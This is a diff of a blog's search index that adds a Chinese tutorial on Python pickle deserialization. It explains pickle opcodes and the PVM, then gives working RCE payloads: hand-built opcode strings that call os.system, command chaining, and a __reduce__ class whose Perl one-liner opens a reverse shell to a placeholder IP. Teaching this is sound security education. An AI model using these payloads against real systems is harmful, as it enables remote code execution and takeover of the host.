@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>java</title>
-    <url>/2024/10/07/java%E5%8F%8D%E5%B0%84/</url>
+    <title></title>
+    <url>/2024/10/07/Java%20%E5%8F%8D%E5%B0%84/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在聊 Java 反射前，我们先来简单的理解一下何为反射</p>
 <p>有“反”，那么相应的也就有“正”，我们先来看看“正”是概念，看一段代码</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">person.setname(<span class="string">&quot;Jack&quot;</span>);</span><br></pre></td></tr></table></figure>
@@ -44,6 +44,502 @@
 <p>运行结果如下</p>
 <p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240929213513698.png" alt="image-20240929213513698"></p>
 <p>对于这一点的利用，如果一个函数中存在 <code>Class.forName(classname)</code>，那么我们便可以通过编写一个恶意类，再将恶意代码放置于 <code>static</code> 中，从而执行</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2024/10/07/Pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="Pickle-简介"><a href="#Pickle-简介" class="headerlink" title="Pickle 简介"></a>Pickle 简介</h2><p>pickle 是 python 中能够序列化和反序列化对象的一个模块，实际上，他跟 python 并没有多大关系，他可以被看做一种独立的“栈语言”，用来实现将 python 对象以及其所拥有的层次结构转换为一个二进制字节流的过程</p>
+<p>当然，除去 pickle 外，python 中还有 marshal 模块也可以完成序列化的任务，但是两者的侧重点不同，marshal 的存在主要是为了支持 python 的 .pyc 文件，在开发时我们也会首选 pickle</p>
+<p>pickle 主要是通过对 opcode 的编写从而进行 python 的代码运行，变量覆盖等操作，直接编写的 opcode 灵活性会比使用 pickle 序列化形成的代码更高，并且有些代码并不能通过 pickle 序列化得到</p>
+<p>由于 opcode 能够执行 python 代码，所以也会引发一系列的安全问题，下面是一张来自 python 在 pickle 文档中的一句警告</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240924214505201.png" alt="image-20240924214505201"></p>
+<h2 id="Pickle-使用示例"><a href="#Pickle-使用示例" class="headerlink" title="Pickle 使用示例"></a>Pickle 使用示例</h2><p>来看一个简单的例子</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.age=<span class="number">18</span></span><br><span class="line">        <span class="variable language_">self</span>.name=<span class="string">&quot;Pickle&quot;</span></span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"><span class="comment">#结果如下</span></span><br><span class="line"><span class="comment">#b&#x27;\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x03age\x94K\x12\x8c\x04name\x94\x8c\x06Pickle\x94ub.&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">P=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The age is:&#x27;</span>+<span class="built_in">str</span>(P.age),<span class="string">&#x27;The name is:&#x27;</span>+P.name)</span><br><span class="line"><span class="comment">#结果如下</span></span><br><span class="line"><span class="comment">#The age is:18 The name is:Pickle</span></span><br></pre></td></tr></table></figure>
+
+<p>逐步分析一下这个过程</p>
+<p>第一步，我们定义了类 Person，其中有两个属性分别是 age 和 name，并且对其进行了赋值</p>
+<p>第二步，我们使用 pickle.dumps() 函数将一个 Person  对象进行序列化，将其转换为二进制字节流的形式</p>
+<p>第三步，使用 pickle.loads() 函数将一串二进制字节流反序列化为一个 Person 对象</p>
+<h2 id="Pickle-中能够序列化的对象"><a href="#Pickle-中能够序列化的对象" class="headerlink" title="Pickle 中能够序列化的对象"></a>Pickle 中能够序列化的对象</h2><p>在 Python 的<a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#what-can-be-pickled-and-unpickled">官方文档</a>中，对能够序列化的对象类型有如下的介绍</p>
+<ul>
+<li><code>None</code>、<code>True</code> 和 <code>False</code></li>
+<li>整数、浮点数、复数</li>
+<li><code>str</code>、<code>byte</code>、<code>bytearray</code></li>
+<li>只包含可打包对象的集合，包括 tuple、list、set 和 dict</li>
+<li>定义在模块顶层的函数（使用 <a href="https://docs.python.org/zh-cn/3.7/reference/compound_stmts.html#def"><code>def</code></a> 定义，<a href="https://docs.python.org/zh-cn/3.7/reference/expressions.html#lambda"><code>lambda</code></a> 函数则不可以）</li>
+<li>定义在模块顶层的内置函数</li>
+<li>定义在模块顶层的类</li>
+<li>某些类实例，这些类的 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#object.__dict__"><code>__dict__</code></a> 属性值或 <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#object.__getstate__"><code>__getstate__()</code></a> 函数的返回值可以被打包（详情参阅 <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle-inst">打包类实例</a> 这一段）</li>
+</ul>
+<p>对于不能序列化的类型，比如 lambda 函数，在使用 pickle 模块的时候会抛出 PicklngError 异常</p>
+<h2 id="Pickle-模块常见方法"><a href="#Pickle-模块常见方法" class="headerlink" title="Pickle 模块常见方法"></a>Pickle 模块常见方法</h2><p>懒得一步步打了，直接 cv 了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.dump(*obj*, *file*, *protocol=None*, ***, *fix_imports=True*)</span><br></pre></td></tr></table></figure>
+
+<p>将打包好的对象 <em>obj</em> 写入文件中，其中 protocol 为 pickling 的协议版本（下同）。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.dumps(*obj*, *protocol=None*, ***, *fix_imports=True*)</span><br></pre></td></tr></table></figure>
+
+<p>将 <em>obj</em> 打包以后的对象作为 <code>bytes</code> 类型直接返回。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.load(*file*, ***, *fix_imports=True*, *encoding=&quot;ASCII&quot;*, *errors=&quot;strict&quot;*)</span><br></pre></td></tr></table></figure>
+
+<p>从文件中读取二进制字节流，将其反序列化为一个对象并返回。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.loads(*data*, ***, *fix_imports=True*, *encoding=&quot;ASCII&quot;*, *errors=&quot;strict&quot;*)</span><br></pre></td></tr></table></figure>
+
+<p>从 data 中读取二进制字节流，将其反序列化为一个对象并返回。</p>
+<h3 id="reduce"><a href="#reduce" class="headerlink" title="_reduce_"></a>_<em>reduce</em>_</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object.__reduce__()</span><br></pre></td></tr></table></figure>
+
+<p><code>__reduce__()</code>其实是 object 类中的一个魔术方法，我们可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行</p>
+<p>_<em>reduce</em>_ 不带任何参数，并且最终会返回字符串或者一个元组，返回的对象我们一般称为 “reduce 值”</p>
+<p>如果返回的是字符串，该字符串会被当做一个全局变量的名称，pickle 会搜索模块命名空间来确定对象所属的模块 ，这种行为常在单例模式中使用</p>
+<p>如果返回的是元组，则应该包含 2 到 6 个元素，可选元素可以省略或者设置为 None，下面是每个元素代表的意义</p>
+<ol>
+<li>一个可调用对象，该对象会在创建对象的最初版本时调用。</li>
+<li>可调用对象的参数，是一个元组。如果可调用对象不接受参数，必须提供一个空元组。</li>
+<li>可选元素，用于表示对象的状态，将被传给前述的 <code>__setstate__()</code> 方法。如果对象没有此方法，则这个元素必须是字典类型，并会被添加至 <code>__dict__</code> 属性中。</li>
+<li>可选元素，一个返回连续项的迭代器（而不是序列）。这些项会被 <code>obj.append(item)</code> 逐个加入对象，或被 <code>obj.extend(list_of_items)</code> 批量加入对象。这个元素主要用于 list 的子类，也可以用于那些正确实现了 <code>append()</code> 和 <code>extend()</code> 方法的类。（具体是使用 <code>append()</code> 还是 <code>extend()</code> 取决于 pickle 协议版本以及待插入元素的项数，所以这两个方法必须同时被类支持）</li>
+<li>可选元素，一个返回连续键值对的迭代器（而不是序列）。这些键值对将会以 <code>obj[key] = value</code> 的方式存储于对象中。该元素主要用于 dict 子类，也可以用于那些实现了 <code>__setitem__()</code> 的类。</li>
+<li>可选元素，一个带有 <code>(obj, state)</code> 签名的可调用对象。该可调用对象允许用户以编程方式控制特定对象的状态更新行为，而不是使用 obj 的静态 <code>__setstate__()</code> 方法。如果此处不是 None，则此可调用对象的优先级高于 obj 的 <code>__setstate__()</code>。</li>
+</ol>
+<p>3.8 新版添加了一个功能，新增了元组的第六项，可选元素 (obj, state)</p>
+<p>在这里，我们可以看出，pickle 并不直接调用上面几个函数。尽管 _<em>reduce</em>_ 这一方法功能很强，但是在实际环境中使用该方法容易产生错误。因此，在设计类的时候，应当尽可能的使用高级接口，比如 __getnewargs_ex__()<code>、</code>__getstate__()<code>和</code>__setstate__()</p>
+<p>Python 要求该方法返回一个字符串或者元组。如果返回元组<code>(callable, ([para1,para2...])[,...])</code> ，那么每当该类的对象被反序列化时，该 <code>callable</code> 就会被调用，参数为 <code>para1、para2...</code></p>
+<h1 id="Pickle-工作原理"><a href="#Pickle-工作原理" class="headerlink" title="Pickle 工作原理"></a>Pickle 工作原理</h1><p>在进行 pickle 反序列化漏洞利用方式前，我们先来简介一下</p>
+<p>pickle 可以被看做是一种独立的栈语言，它是由数串 opcode 指令集组成的，该语言的解析依靠 Pickle Virtual Machine（PVM）进行</p>
+<h2 id="PVM-组成部分"><a href="#PVM-组成部分" class="headerlink" title="PVM 组成部分"></a>PVM 组成部分</h2><p>PVM 由以下三部分组成</p>
+<ul>
+<li>指令处理器：从流中读取 <code>opcode</code> 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。 最终留在栈顶的值将被作为反序列化对象返回。</li>
+<li>stack：由 Python 的 <strong><code>list</code></strong> 实现，被用来临时存储数据、参数以及对象。</li>
+<li>memo：由 Python 的 <strong><code>dict</code></strong> 实现，为 PVM 的整个生命周期提供存储。</li>
+</ul>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240925191453890.png" alt="image-20240925191453890"></p>
+<p>其中，opcode 是单字节的，带参数的指令用换行符来确定边界</p>
+<p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p>
+<ul>
+<li>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python。</li>
+<li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li>
+<li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307"><strong>PEP 307</strong></a>。</li>
+<li>v3 版协议添加于 Python 3.0。它具有对 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes"><code>bytes</code></a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li>
+<li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154"><strong>PEP 3154</strong></a>。</li>
+</ul>
+<p><strong>pickle协议是向前兼容的</strong>，0 号版本的字符串可以直接交给 pickle.loads()，不用担心引发什么意外。下面我们以 V0 版本为例，介绍一下常见的 opcode</p>
+<h2 id="常用-opcode"><a href="#常用-opcode" class="headerlink" title="常用 opcode"></a>常用 opcode</h2><p>在 python 的 pickle.py 中，我们能找到所有的 opcode 及其解释，常用 opcode 如下，以 V0 版本为例</p>
+<table>
+<thead>
+<tr>
+<th align="left">指令</th>
+<th align="left">描述</th>
+<th align="left">具体写法</th>
+<th align="left">栈上的变化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left"></th>
+<th align="left"></th>
+<th align="left"></th>
+<th align="left"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">c</td>
+<td align="left">获取一个全局对象或import一个模块</td>
+<td align="left">c[module]\n[instance]\n</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">o</td>
+<td align="left">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td align="left">o</td>
+<td align="left">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+</tr>
+<tr>
+<td align="left">i</td>
+<td align="left">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td align="left">i[module]\n[callable]\n</td>
+<td align="left">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+</tr>
+<tr>
+<td align="left">N</td>
+<td align="left">实例化一个None</td>
+<td align="left">N</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">S</td>
+<td align="left">实例化一个字符串对象</td>
+<td align="left">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">V</td>
+<td align="left">实例化一个UNICODE字符串对象</td>
+<td align="left">Vxxx\n</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">I</td>
+<td align="left">实例化一个int对象</td>
+<td align="left">Ixxx\n</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">F</td>
+<td align="left">实例化一个float对象</td>
+<td align="left">Fx.x\n</td>
+<td align="left">获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">R</td>
+<td align="left">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td align="left">R</td>
+<td align="left">函数和参数出栈，函数的返回值入栈</td>
+</tr>
+<tr>
+<td align="left">.</td>
+<td align="left">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td align="left">.</td>
+<td align="left">无</td>
+</tr>
+<tr>
+<td align="left">(</td>
+<td align="left">向栈中压入一个MARK标记</td>
+<td align="left">(</td>
+<td align="left">MARK标记入栈</td>
+</tr>
+<tr>
+<td align="left">t</td>
+<td align="left">寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td align="left">t</td>
+<td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">)</td>
+<td align="left">向栈中直接压入一个空元组</td>
+<td align="left">)</td>
+<td align="left">空元组入栈</td>
+</tr>
+<tr>
+<td align="left">l</td>
+<td align="left">寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td align="left">l</td>
+<td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">]</td>
+<td align="left">向栈中直接压入一个空列表</td>
+<td align="left">]</td>
+<td align="left">空列表入栈</td>
+</tr>
+<tr>
+<td align="left">d</td>
+<td align="left">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td align="left">d</td>
+<td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td align="left">}</td>
+<td align="left">向栈中直接压入一个空字典</td>
+<td align="left">}</td>
+<td align="left">空字典入栈</td>
+</tr>
+<tr>
+<td align="left">p</td>
+<td align="left">将栈顶对象储存至memo_n</td>
+<td align="left">pn\n</td>
+<td align="left">无</td>
+</tr>
+<tr>
+<td align="left">g</td>
+<td align="left">将memo_n的对象压栈</td>
+<td align="left">gn\n</td>
+<td align="left">对象被压栈</td>
+</tr>
+<tr>
+<td align="left">0</td>
+<td align="left">丢弃栈顶对象</td>
+<td align="left">0</td>
+<td align="left">栈顶对象被丢弃</td>
+</tr>
+<tr>
+<td align="left">b</td>
+<td align="left">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td align="left">b</td>
+<td align="left">栈上第一个元素出栈</td>
+</tr>
+<tr>
+<td align="left">s</td>
+<td align="left">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td align="left">s</td>
+<td align="left">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+</tr>
+<tr>
+<td align="left">u</td>
+<td align="left">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td align="left">u</td>
+<td align="left">MARK标记以及被组合的数据出栈，字典被更新</td>
+</tr>
+<tr>
+<td align="left">a</td>
+<td align="left">将栈的第一个元素append到第二个元素(列表)中</td>
+<td align="left">a</td>
+<td align="left">栈顶元素出栈，第二个元素（列表）被更新</td>
+</tr>
+<tr>
+<td align="left">e</td>
+<td align="left">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td align="left">e</td>
+<td align="left">MARK标记以及被组合的数据出栈，列表被更新</td>
+</tr>
+</tbody></table>
+<h2 id="PVM-工作流程"><a href="#PVM-工作流程" class="headerlink" title="PVM 工作流程"></a>PVM 工作流程</h2><p>下面是两张动图，用于描述 PVM 的工作流程</p>
+<p><img src="C:\Users\Administrator\Pictures\POC.gif" alt="POC"></p>
+<p><img src="C:\Users\Administrator\Pictures\20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1"></p>
+<p>第一张是 PVM 解析 str 的过程，第二张是解析 _<em>reduce</em>_() 的过程</p>
+<p>来具体演示一下，假设此时操作码如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">cos</span><br><span class="line">system   <span class="comment">#字节码为c，形式为c[moudle]\n[instance]\n，导入os.system。并将函数压入stack</span></span><br><span class="line"> </span><br><span class="line">(S<span class="string">&#x27;ls&#x27;</span>   <span class="comment">#字节码为(，向stack中压入一个MARK。字节码为S，示例化一个字符串对象&#x27;whoami&#x27;并将其压入stack</span></span><br><span class="line"> </span><br><span class="line">tR.      <span class="comment">#字节码为t，寻找栈中MARK，并组合之间的数据为元组。然后通过字节码R执行os.system(&#x27;whoami&#x27;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#字节码为.，程序结束，将栈顶元素os.system(&#x27;ls&#x27;)作为返回值</span></span><br></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#desktop-3i4hban\administrator</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h2><p>我们可以使用 pickletools 模块，来使 opcode 变成更便于我们阅读的形式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line">   <span class="number">11</span>: (    MARK</span><br><span class="line">   <span class="number">12</span>: S        STRING     <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">22</span>: t        TUPLE      (MARK at <span class="number">11</span>)</span><br><span class="line">   <span class="number">23</span>: R    REDUCE</span><br><span class="line">   <span class="number">24</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Pickle-反序列化漏洞"><a href="#Pickle-反序列化漏洞" class="headerlink" title="Pickle 反序列化漏洞"></a>Pickle 反序列化漏洞</h1><h2 id="基本演示"><a href="#基本演示" class="headerlink" title="基本演示"></a>基本演示</h2><p>我们先来简单演示一下，pickle 反序列化漏洞是如何引发安全问题的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.age=<span class="number">18</span></span><br><span class="line">        <span class="variable language_">self</span>.name=<span class="string">&quot;Pickle&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">r&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"> </span><br><span class="line">P=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The age is:&#x27;</span>+<span class="built_in">str</span>(P.age),<span class="string">&#x27;The name is:&#x27;</span>+P.name)</span><br></pre></td></tr></table></figure>
+
+<p>在这里，我们可以看到，与上面不同的是，我们在 Person 类中加入了一个魔术方法 _<em>reduce</em>_ 函数，对于这个函数在上面我们已经进行了详细的介绍，这里不过多赘述</p>
+<p>在字节流被反序列化的时候，python 会执行 callable(para1, para2, …) 函数，因此会执行上面的 os.system(command)</p>
+<p>最后执行结果如下</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240925190454066.png" alt="image-20240925190454066"></p>
+<p>接下来介绍其他的利用方式</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>上面已经提到了，我们可以通过在类中重写 _<em>reduce</em>_() 方法，从而在反序列化时可以实现 RCE</p>
+<p>但是这种方式一次只能执行一个命令，如果一次想执行多个命令，就只能通过手写来拼接 opcode</p>
+<p>在 opcode 中，符号 <strong>.</strong> 是程序结束的标志，我们可以去掉 <strong>.</strong> 来将两个字节流进行拼接</p>
+<p>一条命令如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br></pre></td></tr></table></figure>
+
+<p>进行两条命令的拼接</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tRcos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240925195316224.png" alt="image-20240925195316224"></p>
+<p>在 pickle，可以函数执行的字节码除 R 以外，还有 i 和 o，因此，我们共有三个方向可以构造 payload</p>
+<h3 id="R"><a href="#R" class="headerlink" title="R"></a>R</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode1=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="i"><a href="#i" class="headerlink" title="i"></a>i</h3><p>i 相当于 c 和 o 的结合，也就是先获取一个全局函数，再寻找栈中上一个 MARK，并且组合之间的数据为元组，以该彦祖为参数执行获取到的全局函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="o"><a href="#o" class="headerlink" title="o"></a>o</h3><p>o 用于寻找栈中的上一个 MARK，以之间的第一个数据为 callable（要求第一个数据必须是函数），第 2 到 n 个数据为参数，再执行该函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode3=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，部分 linux 系统下和 windows 系统下的 opcode 字节流并不兼容，比如 windows 谢爱执行系统命令函数为 os.system()，在部分 linux 下则为 posix.system()</p>
+<p>pickle.loads 会解决 import 问题，即对于未引入的 moudle 会自动尝试 import，也就是说整个 python 标准库的代码执行和命令执行函数我们都可以使用</p>
+<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&quot;&quot;&quot;perl -e &#x27;use Socket;$i=&quot;xx.xxx.xxx.xxx&quot;;$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;&quot;&quot;&quot;</span>,))</span><br><span class="line">admin=Person()</span><br><span class="line">a=pickle.dumps(admin)</span><br><span class="line">pickle.loads(a)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h2><p>实例化对象也是一种特殊的函数执行，同样可以通过手写 opcode 来构造</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, age, name</span>):</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">Person</span></span><br><span class="line"><span class="string">(I18</span></span><br><span class="line"><span class="string">S&#x27;Pickle&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p = pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(p.age, p.name)</span><br></pre></td></tr></table></figure>
+
+<p>最后运行结果如下</p>
+<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240925202702712.png" alt="image-20240925202702712"></p>
